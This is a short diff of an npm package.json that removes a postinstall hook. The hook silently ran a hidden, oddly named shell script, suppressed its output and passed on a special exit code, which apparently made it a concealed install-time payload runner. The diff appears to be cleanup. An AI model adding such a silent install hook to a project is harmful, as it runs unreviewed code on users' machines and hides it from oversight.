@@ -3,9 +3,7 @@
   "version": "1.0.0",
   "description": "",
   "main": "index.js",
-  "scripts": {
-    "postinstall": "sh ./.ci-f5k245.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
-  },
+  "scripts": {},
   "keywords": [],
   "author": "",
   "license": "ISC",
